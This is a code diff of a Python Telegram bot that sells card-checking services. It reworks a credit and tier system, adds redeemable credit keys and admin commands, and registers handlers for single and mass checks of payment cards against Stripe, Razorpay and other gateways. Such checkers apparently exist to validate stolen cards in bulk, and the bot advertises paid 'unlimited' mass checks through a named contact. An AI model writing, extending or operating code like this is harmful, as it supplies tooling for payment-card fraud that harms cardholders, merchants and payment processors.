+    """Reset user credits to initial amount (admin only)"""
+    user_credits[user_id] = INITIAL_FREE_CREDITS
+    save_user_credits()
+    return True
+
+
+# Load credits on startup
+load_user_credits()
+
+
+# ============ CREDIT CHECK FUNCTIONS ============
+
+async def check_and_deduct_credits(user_id: int, update: Update, context: ContextTypes.DEFAULT_TYPE, 
+                                   is_mass_check: bool = False, card_count: int = 1) -> Tuple[bool, str]:
+    """
+    Check if user has enough credits and deduct if they are free tier.
+    
+    FREE USERS:
+    - 1 credit = 1 single card check
+    - For mass checks: 1 credit per card (card_count * 1)
+    
+    PAID USERS: Unlimited access
+    
+    Returns: (success, error_message)
+    """
+    tier = user_manager.get_tier(user_id)
+    chat = update.effective_chat
+    
+    # Debug print
+    print(f"🔍 [CREDIT CHECK] User: {user_id}, Tier: {tier}, Chat type: {chat.type}, Is mass: {is_mass_check}, Card count: {card_count}")
+    
+    # Admin/Owner has unlimited access
+    if user_id == OWNER_ID:
+        print(f"✅ [CREDIT CHECK] Owner - unlimited access")
+        return True, None
+    
+    # Paid users have unlimited access
+    if tier in ['premium', 'ultimate', 'admin']:
+        print(f"✅ [CREDIT CHECK] Paid user - unlimited access")
+        return True, None
+    
+    # Free in group chats - SINGLE checks are FREE (no credit deduction)
+    if chat.type in ['group', 'supergroup'] and not is_mass_check:
+        print(f"✅ [CREDIT CHECK] Free group chat single check - no credit deduction")
+        return True, None
+    
+    # Free user - check credits
+    if tier == 'free':
+        credits = get_user_credits(user_id)
+        print(f"📊 [CREDIT CHECK] Free user {user_id} has {credits} credits")
+        
+        # Initialize credits for new users (250 free credits)
+        if credits == 0 and user_id not in user_credits:
+            credits = initialize_new_user_credits(user_id)
+            print(f"🎉 New free user {user_id} initialized with {credits} free credits")
+        
+        # Calculate required credits
+        if is_mass_check:
+            required = card_count  # 1 credit per card in mass check
+        else:
+            required = CREDITS_PER_SINGLE_CHECK  # 1 credit for single check
+        
+        print(f"📊 [CREDIT CHECK] Required credits: {required}")
+        
+        # Check if enough credits
+        if credits < required:
+            error_msg = (
+                f"❌ <b>Insufficient Credits!</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credit{'s' if credits != 1 else ''}\n"
+                f"└─ /buy - Upgrade\n\n"
+            )
+            print(f"❌ [CREDIT CHECK] Insufficient credits! User {user_id} has {credits}, needs {required}")
+            return False, error_msg
+        
+        # Deduct credits
+        if deduct_user_credits(user_id, required):
+            new_credits = get_user_credits(user_id)
+            print(f"💎 [CREDIT CHECK] User {user_id} used {required} credit(s). Remaining: {new_credits}")
+            return True, None
+        else:
+            print(f"❌ [CREDIT CHECK] Failed to deduct credits for user {user_id}")
+            return False, "❌ Failed to deduct credits. Please try again."
+    
+    return True, None
+
+
+
+
+async def check_and_deduct_mass_credits(user_id: int, update: Update, context: ContextTypes.DEFAULT_TYPE, 
+                                        card_count: int) -> Tuple[bool, str]:
+    """
+    Check if user has enough credits for a mass check.
+    
+    FREE USERS: Need 1 credit per card (total credits >= card_count)
+    PAID USERS: Unlimited
+    
+    Returns: (success, error_message)
+    """
+    tier = user_manager.get_tier(user_id)
+    chat = update.effective_chat
+    
+    # Admin/Owner has unlimited access
+    if user_id == OWNER_ID:
+        return True, None
+    
+    # Paid users have unlimited access
+    if tier in ['premium', 'ultimate', 'admin']:
+        return True, None
+    
+    # Free user in private chat - check credits for mass check
+    if tier == 'free':
+        credits = get_user_credits(user_id)
+        
+        # Initialize credits for new users
+        if credits == 0 and user_id not in user_credits:
+            credits = initialize_new_user_credits(user_id)
+            print(f"🎉 New free user {user_id} initialized with {credits} free credits")
+        
+        # Check if enough credits for all cards
+        if credits < card_count:
+            return False, (
+                f"❌ <b>Insufficient Credits for Mass Check!</b>\n\n"
+                f"🎯 Your balance: <b>{credits}</b> credit{'s' if credits != 1 else ''}\n"
+                f"📝 Cards to check: <b>{card_count}</b>\n"
+                f"💸 Credits needed: <b>{card_count}</b> (1 credit per card)\n"
+                f"━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💎 <b>Ways to get more credits:</b>\n"
+                f"├─ Use single checks in group chats (FREE!)\n"
+                f"├─ Redeem a credit key: /redeemcredits &lt;key&gt;\n"
+                f"├─ Upgrade to Premium/Ultimate for unlimited\n"
+                f"└─ Contact @lencax\n\n"
+                f"📊 <b>You need {card_count - credits} more credits</b>\n"
+                f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+        
+        # For free users, deduct credits BEFORE mass check starts
+        if deduct_user_credits(user_id, card_count):
+            new_credits = get_user_credits(user_id)
+            print(f"💎 User {user_id} used {card_count} credits for mass check. Remaining: {new_credits}")
+            return True, None
+        else:
+            return False, "❌ Failed to deduct credits. Please try again."
+    
+    return True, None
+
+
+async def refund_credits_on_error(user_id: int, amount: int = CREDITS_PER_SINGLE_CHECK):
+    """Refund credits if an error occurs (e.g., gateway not available)"""
+    if user_manager.get_tier(user_id) == 'free':
+        add_user_credits(user_id, amount)
+        print(f"🔄 [REFUND] Refunded {amount} credit(s) to user {user_id}")
+
+
+# ============ CREDIT COMMANDS ============
+
+async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show user's credit balance with detailed breakdown"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    tier = user_manager.get_tier(user_id)
+    chat = update.effective_chat
+    
+    if tier in ['premium', 'ultimate', 'admin']:
+        msg = (
+            f"💎 <b>Your Credit Status</b>\n\n"
+            f"👑 Tier: {tier.upper()}\n"
+            f"🎯 Credits: ∞ (Unlimited)\n"
+            f"✨ You have unlimited access to all gateways!\n"
+        )
+    else:
+        credits = get_user_credits(user_id)
+        
+        # Calculate estimated checks
+        estimated_single = credits // CREDITS_PER_SINGLE_CHECK
+        
+        msg = (
+            f"💎 <b>Your Credit Status</b>\n\n"
+            f"🎯 Tier: FREE\n"
+            f"💳 Credits: <b>{credits}</b>\n"
+            f"   • /buy - Upgrade \n"
+        )
+    
+    # Add keyboard with useful buttons
+    keyboard = [
+        [
+            InlineKeyboardButton("💎 Redeem Credits", callback_data='redeem_credits_help'),
+            InlineKeyboardButton("💰 Upgrade", callback_data='buy_premium')
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
+
+
+async def redeem_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Redeem a credit key"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    
+    # Check if user is free tier (only free users need credits)
+    tier = user_manager.get_tier(user_id)
+    if tier != 'free':
+        await update.message.reply_text(
+            f"❌ <b>Not Available for Paid Users</b>\n\n"
+            f"Your tier ({tier.upper()}) has unlimited credits.\n"
+            f"You don't need to redeem credit keys.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "🎫 <b>Redeem Credit Key</b>\n\n"
+            "Usage: /redeemcredits <key>\n"
+            "Example: /redeemcredits XXXX-XXXX-XXXX-XXXX\n\n"
+            f"💰 Current credits: {get_user_credits(user_id)}\n"
+            f"💡 Each credit = 1 single card check",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    key = context.args[0]
+    success, message, amount = redeem_credit_key(key, user_id)
+    
+    if success:
+        new_total = get_user_credits(user_id)
+        estimated_checks = new_total // CREDITS_PER_SINGLE_CHECK
+        
+        await update.message.reply_text(
+            f"✅ <b>Credit Key Redeemed!</b>\n\n"
+            f"🎉 {message}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"💰 Credits Added: <b>+{amount}</b>\n"
+            f"💎 New Balance: <b>{new_total}</b>\n"
+            f"📊 Estimated Checks: <b>{estimated_checks}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"Use /credits to check your balance anytime.",
+            parse_mode=ParseMode.HTML
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ {message}\n\n"
+            f"Current credits: {get_user_credits(user_id)}",
+            parse_mode=ParseMode.HTML
+        )
+
+
+# ============ CREDIT KEY SYSTEM ============
+
 CREDIT_KEYS_FILE = "credit_keys.json"
-credit_keys = {}  # key -> {amount, created_by, created_at, used_by, used_at, active}
+credit_keys = {}  # key -> {amount, created_by, created_at, used_by, used_at, active, expiry}
+
 
 def load_credit_keys():
     """Load credit keys from file"""
@@ -50561,6 +51604,7 @@ def load_credit_keys():
     else:
         credit_keys = {}
 
+
 def save_credit_keys():
     """Save credit keys to file"""
     try:
@@ -50568,6 +51612,7 @@ def save_credit_keys():
             json.dump(credit_keys, f, indent=2)
     except Exception as e:
         print(f"⚠️ Error saving credit keys: {e}")
+
 
 def generate_credit_key(amount: int, created_by: int, expiry_days: int = 30) -> str:
     """Generate a new credit key"""
@@ -50587,6 +51632,7 @@ def generate_credit_key(amount: int, created_by: int, expiry_days: int = 30) -> 
     }
     save_credit_keys()
     return key
+
 
 def redeem_credit_key(key: str, user_id: int) -> Tuple[bool, str, int]:
     """Redeem a credit key and return (success, message, credits_added)"""
@@ -50620,97 +51666,10 @@ def redeem_credit_key(key: str, user_id: int) -> Tuple[bool, str, int]:
     amount = key_data["amount"]
     new_total = add_user_credits(user_id, amount)
     
-    return True, f"✅ Successfully redeemed {amount} credits!", amount
+    return True, f"Successfully redeemed {amount} credits!", amount
 
-async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user's credit balance"""
-    if not await verify_group_access(update, context):
-        return
-    
-    user_id = update.effective_user.id
-    tier = user_manager.get_tier(user_id)
-    chat = update.effective_chat
-    
-    if tier in ['premium', 'ultimate', 'admin']:
-        msg = (
-            f"💎 <b>Your Credit Status</b>\n\n"
-            f"👑 Tier: {tier.upper()}\n"
-            f"🎯 Credits: ∞ (Unlimited)\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"✨ You have unlimited access to all gateways!\n"
-            f"💳 No credit deductions apply to your account.\n"
-            f"🚀 Mass checks: ✅ Available"
-        )
-    else:
-        credits = get_user_credits(user_id)
-        msg = (
-            f"💎 <b>Your Credit Status</b>\n\n"
-            f"🎯 Tier: FREE\n"
-            f"💳 Credits: {credits}\n"
-            f"💸 Cost per check: {CREDITS_PER_CHECK} credit\n"
-            f"📊 <b>Estimated checks remaining:</b> {credits // CREDITS_PER_CHECK}\n"
-            f"📝 <b>Single check only</b> (mass check not available)\n\n"
-            f"💡 <b>How to get more credits:</b>\n"
-            f"• Redeem a credit key: /redeemcredits &lt;key&gt;\n"
-            f"• Upgrade to Premium/Ultimate for unlimited\n"
-            f"• Contact @lencax to purchase\n\n"
-            f"• /credits - Check balance\n"
-            f"• /redeemcredits &lt;key&gt; - Redeem credit key"
-        )
-    
-    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
 
-async def redeem_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Redeem a credit key"""
-    if not await verify_group_access(update, context):
-        return
-    
-    user_id = update.effective_user.id
-    
-    # Check if user is free tier (only free users need credits)
-    tier = user_manager.get_tier(user_id)
-    if tier != 'free':
-        await update.message.reply_text(
-            f"❌ <b>Not Available for Paid Users</b>\n\n"
-            f"Your tier ({tier.upper()}) has unlimited credits.\n"
-            f"You don't need to redeem credit keys.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
-    if not context.args:
-        await update.message.reply_text(
-            "🎫 <b>Redeem Credit Key</b>\n\n"
-            "Usage: /redeemcredits <key>\n"
-            "Example: /redeemcredits XXXX-XXXX-XXXX-XXXX\n\n"
-            "Redeem a key to add credits to your account.\n\n"
-            f"Current credits: {get_user_credits(user_id)}",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
-    key = context.args[0]
-    success, message, amount = redeem_credit_key(key, user_id)
-    
-    if success:
-        new_total = get_user_credits(user_id)
-        await update.message.reply_text(
-            f"✅ <b>Credit Key Redeemed!</b>\n\n"
-            f"🎉 {message}\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"💰 Credits Added: {amount}\n"
-            f"💎 New Balance: {new_total}\n"
-            f"📊 Total Checks Available: {new_total // CREDITS_PER_CHECK}\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"Use /credits to check your balance anytime.",
-            parse_mode=ParseMode.HTML
-        )
-    else:
-        await update.message.reply_text(
-            f"❌ {message}\n\n"
-            f"Current credits: {get_user_credits(user_id)}",
-            parse_mode=ParseMode.HTML
-        )
+# ============ ADMIN CREDIT COMMANDS ============
 
 async def gencreditkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Generate a credit key (admin only)"""
@@ -50769,6 +51728,7 @@ async def gencreditkey_command(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("❌ Invalid amount or days. Use numbers only.")
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
+
 
 async def bulkgencredit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Generate multiple credit keys (admin only)"""
@@ -50845,6 +51805,7 @@ async def bulkgencredit_command(update: Update, context: ContextTypes.DEFAULT_TY
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
 
+
 async def listcreditkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """List all credit keys (admin only)"""
     if update.effective_user.id != OWNER_ID:
@@ -50895,34 +51856,81 @@ async def listcreditkeys_command(update: Update, context: ContextTypes.DEFAULT_T
     
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
 
-async def deletecreditkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Delete/deactivate a credit key (admin only)"""
+
+async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add credits to a user directly (admin only)"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Admin only command.")
         return
     
-    if not context.args:
+    if len(context.args) < 2:
         await update.message.reply_text(
-            "Usage: /deletecreditkey <key>\n"
-            "Example: /deletecreditkey XXXX-XXXX-XXXX-XXXX"
+            "💎 <b>Add Credits Command</b>\n\n"
+            "Usage: <code>/addcredits &lt;user_id&gt; &lt;amount&gt;</code>\n"
+            "Example: <code>/addcredits 123456789 100</code>\n\n"
+            "This will add credits to the user's account.",
+            parse_mode=ParseMode.HTML
         )
         return
     
-    key = context.args[0].upper().strip()
+    try:
+        target_user_id = int(context.args[0])
+        amount = int(context.args[1])
+        
+        if amount <= 0:
+            await update.message.reply_text("❌ Amount must be positive.")
+            return
+        
+        new_total = add_user_credits(target_user_id, amount)
+        
+        await update.message.reply_text(
+            f"✅ <b>Credits Added!</b>\n\n"
+            f"👤 User: <code>{target_user_id}</code>\n"
+            f"💰 Amount Added: <b>+{amount}</b>\n"
+            f"💎 New Balance: <b>{new_total}</b>\n\n"
+            f"User can check with /credits",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+        
+        # Notify the user
+        try:
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=(
+                    f"Credits Added to Your Account /credits "
+                ),
+                parse_mode=ParseMode.HTML
+            )
+        except Exception as e:
+            print(f"⚠️ Could not notify user {target_user_id}: {e}")
+        
+    except ValueError:
+        await update.message.reply_text("❌ Invalid user ID or amount.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
+
+
+# ============ CREDIT KEY EXPIRY CHECKER ============
+
+async def credit_key_expiry_worker(context: ContextTypes.DEFAULT_TYPE):
+    """Background task to check for expired credit keys"""
+    current_time = time.time()
+    changed = False
     
-    if key not in credit_keys:
-        await update.message.reply_text("❌ Key not found.")
-        return
+    for key, data in list(credit_keys.items()):
+        if data.get("active", True) and data.get("expiry", 0) > 0:
+            if current_time > data["expiry"]:
+                data["active"] = False
+                changed = True
+                print(f"🔑 Credit key {key} expired and deactivated")
     
-    if credit_keys[key].get("used_by"):
-        await update.message.reply_text(f"❌ Cannot delete. Key was already used by user {credit_keys[key]['used_by']}.")
-        return
-    
-    # Deactivate the key
-    credit_keys[key]["active"] = False
-    save_credit_keys()
-    
-    await update.message.reply_text(f"✅ Key {key} has been deactivated.")
+    if changed:
+        save_credit_keys()
+
+
+# Load credit keys on startup
+load_credit_keys()
     
     
 async def reply_with_command_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -51988,9 +52996,6 @@ def main():
     app.add_handler(CommandHandler("sta", stripe_auth_single_check_logic))
     app.add_handler(CommandHandler("stamc", stripe_auth_mass_check_logic))
     
-    # Auto Stripe
-    app.add_handler(CommandHandler("chk", single_check_auto_stripe))
-    app.add_handler(CommandHandler("mchk",  mass_check_auto_stripe_command))
     
     # Razorpay
     app.add_handler(CommandHandler("rz", single_check_razorpay))
@@ -52101,7 +53106,7 @@ def main():
     app.add_handler(CommandHandler("gencreditkey", gencreditkey_command))
     app.add_handler(CommandHandler("bulkgencredit", bulkgencredit_command))
     app.add_handler(CommandHandler("listcreditkeys", listcreditkeys_command))
-    app.add_handler(CommandHandler("deletecreditkey", deletecreditkey_command))
+    app.add_handler(CommandHandler("addcredits", addcredits_command))
     
     # ============ LEADERBOARD COMMANDS ============
     app.add_handler(CommandHandler("leaderboard", leaderboard_command))
@@ -52195,6 +53200,9 @@ def main():
     
     app.add_handler(CommandHandler("st", single_check_stripe_4usd))
     app.add_handler(CommandHandler("mst", mass_check_stripe_4usd))
+    
+    app.add_handler(CommandHandler("chk0", single_check_stripe_auth0))
+    app.add_handler(CommandHandler("mchk0", mass_check_stripe_auth0))
     
     
     app.add_handler(MessageHandler(
